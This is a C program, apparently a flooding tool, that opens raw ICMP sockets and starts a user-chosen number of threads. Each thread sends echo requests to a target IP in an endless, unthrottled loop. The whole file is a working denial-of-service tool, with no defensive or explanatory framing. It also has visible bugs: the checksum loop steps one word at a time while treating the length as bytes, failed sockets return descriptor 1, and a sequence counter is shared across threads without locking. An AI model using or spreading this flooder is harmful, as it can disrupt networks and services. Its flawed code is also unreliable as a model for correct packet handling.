#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <sys/time.h>

struct thread_para{
	int socketfd;
	struct sockaddr_in* desaddr;
};

#define DATAGRAM_LEN 1500 
#define DATA_LEN 56

int len = 64;

int get_socket()
{
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (sock == -1)
	{
		printf("socket creation failed\n");
		return 1;
    }
	return sock;
}

unsigned short checksum(u_short* addr, int len)
{
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;
    while(nleft > 1)
    {
        sum += *w++;
        nleft--;
    }
    if (nleft == 1)
    {
        *(unsigned char*)(&answer) = *(unsigned char*)w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

void create_icmp_request_packet(char* out_packet)
{
    static int nsent = 0;
    struct icmp* icmp = (struct icmp*) out_packet;
	icmp->icmp_type = ICMP_ECHO;
	icmp->icmp_code = 0;
	icmp->icmp_id = getpid() & 0xffff;
	icmp->icmp_seq = nsent++;
	memset(icmp->icmp_data, 0xa5, DATA_LEN);
	gettimeofday((struct timeval *) icmp->icmp_data, NULL);
	icmp->icmp_cksum = 0;
	icmp->icmp_cksum = checksum((u_short *) icmp, len);
}

void* thread_handler(void* para)
{
	char* packet = calloc(DATAGRAM_LEN, sizeof(char));
	int packet_len;
	int sent;
	struct thread_para* temp = (struct thread_para*) para;

	while(1)
	{
		create_icmp_request_packet(packet);
		if ((sent = sendto(temp->socketfd, packet, len, 0, (struct sockaddr*)temp->desaddr, sizeof(struct sockaddr))) == -1)
		{
			printf("sendto() failed\n");
		}
		else
		{
			printf("successfully sent %d bytes ICMP!\n", sent);
		}
		memset(packet, 0, DATAGRAM_LEN);
	}

}

int main(int argc, char** argv)
{
	if (argc != 3)
	{
		printf("USAGE %s <target-ip> <num_of_threads>\n", argv[0]);
		return 1;
	}

	int num_of_threads = atoi(argv[2]);
    pthread_t* thread_id = (pthread_t*) calloc(num_of_threads, sizeof(pthread_t));  
    struct thread_para* thread_prime = (struct thread_para*) calloc(num_of_threads, sizeof(struct thread_para));

	struct sockaddr_in daddr;
	daddr.sin_family = AF_INET;
	if (inet_pton(AF_INET, argv[1], &daddr.sin_addr) != 1)
	{
		printf("destination IP configuration failed\n");
		return 1;
	}


	for (int i = 0; i < num_of_threads; i++)
	{
		thread_prime[i].socketfd = get_socket();
		thread_prime[i].desaddr = &daddr; 
		if (pthread_create(&thread_id[i], NULL, thread_handler, (void*) &thread_prime[i]) != 0) 
		{
			perror("Error creating thread");
			return 1;
		} 
		printf("%ld\n", thread_id[i]);
	}
	for (int i = 0; i < num_of_threads; i++)
	{
		if (pthread_join(thread_id[i], NULL) != 0) 
		{
			perror("Error joining thread");
			return 1;
		}
	}
	exit(EXIT_SUCCESS);

}
